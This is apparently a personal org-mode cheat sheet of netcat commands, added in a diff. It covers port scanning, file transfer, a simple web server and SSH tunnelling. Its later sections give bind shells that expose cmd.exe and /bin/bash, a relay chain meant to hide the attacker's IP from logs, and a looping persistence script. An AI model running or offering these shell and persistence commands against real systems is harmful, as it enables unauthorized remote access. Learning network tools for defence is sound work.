@@ -1,1 +1,135 @@
-/home/crito/org/tech/security/security_tools/netcat.org
+#+TAGS: net op
+
+
+* netcat							     :net:op:
+* Description
+* Usage
+
+> netcat <options> host port
+
+** Send a udp packet instead of initiating with tcp connection
+#+BEGIN_SRC sh
+netcat -u $HOST $PORT
+#+END_SRC
+
+** Port Scanning 
+- with the domain
+#+BEGIN_SRC sh
+netcat -z -v domain.com 1-1000 2>&1 | grep "succeeded"
+#+END_SRC
+- without the domain
+#+BEGIN_SRC sh
+netcat -z -n -v 127.0.0.1 1-1000 2>&1 | grep "succeeded"
+#+END_SRC
+
+** Communicate through Netcat
+- On the server run
+#+BEGIN_SRC sh
+netcat -l 4444
+#+END_SRC
+
+#+BEGIN_SRC sh
+netcat $DOMAIN 4444
+#+END_SRC
+
+- messages will now be able to send messages between the server and client
+
+** Sending data 
+- On the machine that wants the file
+#+BEGIN_SRC sh
+netcat -l 4444 > recieved_file
+#+END_SRC
+
+- On the sending machine
+#+BEGIN_SRC sh
+netcat $DOMAIN 4444 < original_file
+#+END_SRC
+
+*** Sending a directory compressed
+- On the machine that wants the file
+#+BEGIN_SRC sh
+netcat -l 4444 | tar xvf -
+#+END_SRC
+- the dash indicates that the tar will operate on std input
+
+- On the sending machine from inside the directory that is to be copied over
+#+BEGIN_SRC sh
+tar -czf - * | netcat $DOMAIN 4444
+#+END_SRC
+
+** Simple Web Server
+- On sever run:
+#+BEGIN_SRC sh
+netcat -l 4444 < index.html
+#+END_SRC
+
+- To continually server page after first connection is closed
+#+BEGIN_SRC sh
+while true; do netcat -l 4444 < index.html; done
+#+END_SRC
+
+** Redirect a windows shell
+#+BEGIN_SRC sh
+nc -l -p 9999 -e cmd.exe
+#+END_SRC
+- ensure that the version of netcat that you use has the execute flag compiled
+- always keep in mind that you are not in a terminal, but a cmd over the network
+
+** Using netcat as a relay
+Machine 1 - 192.168.0.10
+#+BEGIN_SRC sh
+netcat 192.168.0.11 -p 7777
+#+END_SRC
+
+Machine 2 - 192.168.0.11
+#+BEGIN_SRC sh
+netcat -l -p 7777 0<backpipe | netcat 192.168.0.12 8888 1>backpipe
+#+END_SRC
+- thiw now passes traffice between machine 1 and machine 2
+
+Machine 3 - 192.168.0.12
+#+BEGIN_SRC sh
+netcat -L -p 9999 -e cmd.exe
+#+END_SRC
+L - persistent (only available on windows)
+
+-for persistents on linux the script below can be used
+#+BEGIN_SRC sh
+while [ 1 ]; do echo "Netcat has 9 lives. Port is 7777"; nc -l -p 777 -e /bin/bash; done
+#+END_SRC
+
+All traffic logged on machine 3 would only show the ip for Machine 2
+
+** Persistence
+- Windows
+#+BEGIN_SRC sh
+netcat -L -p 9999 -e cmd.exe
+#+END_SRC
+L - persistent (only available on windows)
+
+- Linux - 9lives.sh
+#+BEGIN_SRC sh
+while [ 1 ]; do echo "Netcat has 9 lives. Port is 7777"; nc -l -p 777 -e /bin/bash; done
+#+END_SRC
+
+** Tunneling with ssh
+#+BEGIN_SRC sh
+ssh -i Documents/id_rsa -L 8888:172.168.0.129:80 alick@172.16.0.134
+#+END_SRC
+** Getting site header
+#+BEGIN_SRC sh
+netcat example.com 80 <<END
+HEAD / HTTP/1.1
+Host: example.com
+
+
+END
+#+END_SRC
+* Lecture
+* Tutorial
+** [[https://www.youtube.com/watch?v%3Dqo_sFS2A-mI][Introduction to Data Transfer with NetCat]]
+
+* Books
+[[file://home/crito/Documents/Security/Tools/Netcat_Starter.pdf][Netcat Starter]]
+[[file://home/crito/Documents/Security/Tools/Netcat_Power_Tools.pdf][Netcat Power Tools]]
+* Links
